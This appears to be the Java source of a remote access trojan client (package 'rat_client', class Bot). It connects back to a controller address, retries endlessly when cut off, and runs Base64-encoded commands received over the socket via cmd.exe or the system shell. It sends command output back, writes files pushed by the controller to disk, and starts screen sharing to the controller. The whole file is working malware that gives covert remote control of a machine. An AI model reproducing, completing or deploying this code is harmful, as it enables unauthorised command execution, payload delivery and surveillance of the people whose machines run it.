package rat_client;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;

public class Bot implements Runnable
{
    private Socket socket;
    private BufferedReader in;
    private Process p;
    private Thread thread;
    private int port;
    private String ip,os_name;
    private SecretKey secretKey;
    private Cipher aes_cipher;
    private String key;
    private byte[] end_flag=null;
    
    public Bot(String ip,int port)
    {
            this.ip=ip;
            this.port=port;
            os_name=System.getProperty("os.name").toLowerCase();
            thread=new Thread(this);
            thread.start();
    }

    private void createBotStream()
    {    
        try
        {
            ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
            ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
            Runtime runtime=Runtime.getRuntime();
            System.out.println("Connected");
            while(socket.isConnected())
            {
                System.out.println(socket.getInetAddress().getHostAddress());
                boolean stop_curr=false,output=true,file=false,screen_sharing;
                output=ois.readBoolean();
                file=ois.readBoolean();
                screen_sharing=ois.readBoolean();
                if(!file&&!screen_sharing)
                {
                    String command=new String(Base64.decode(ois.readUTF()));
                    System.out.println(command);
                    if(os_name.contains("win"))
                        p=runtime.exec("cmd.exe /c"+command);
                    else
                        p=runtime.exec(command);
                    in=new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while(!stop_curr&&(line=in.readLine())!=null)
                    {     
                         System.out.println(line);
                         if(output)
                         {
                            oos.writeUTF(Base64.encode(line.getBytes()));
                            oos.flush();
                         }
                         stop_curr=ois.readBoolean();
                    }
                    if(stop_curr)
                        System.out.println("Process Stopped");
                    stop_curr=false;
                    if(output)
                    {
                        oos.writeUTF(Base64.encode("END_OF_TRASMISSION".getBytes()));
                        oos.flush();
                    }
                }
                else if(file)
                {
                    String file_name=ois.readUTF();
                    byte[] fileData=(byte[])ois.readObject();
                    oos.writeUTF("ACK");
                    oos.flush();
                    hexByteToBinaryFile(fileData,file_name);
                }
                else if(screen_sharing)
                {
                    System.out.println("sharing screen...");
                    new ScreenMonitor(ip,54323);
                }
            }
            oos.writeObject(end_flag);
            oos.flush();
            in.close();
            socket.close();
            thread=new Thread(this);
            thread.start();
        }
        catch(IOException exc)
        {
            thread=new Thread(this);
            thread.start();
        }
        catch(ClassNotFoundException exc)
        {
            
        }
    }
    
    private void hexByteToBinaryFile(final byte[] hex,String FILE_NAME) throws IOException
    {
        FileOutputStream stream=new FileOutputStream(FILE_NAME);
        stream.write(hex);
        stream.close();
    }
    
    @Override
    public void run()
    {
        while(true)
          try
          {
              socket=new Socket(ip,port);
              createBotStream();
              return;
          }
          catch(IOException exc)
          {
            
          }
    }
}
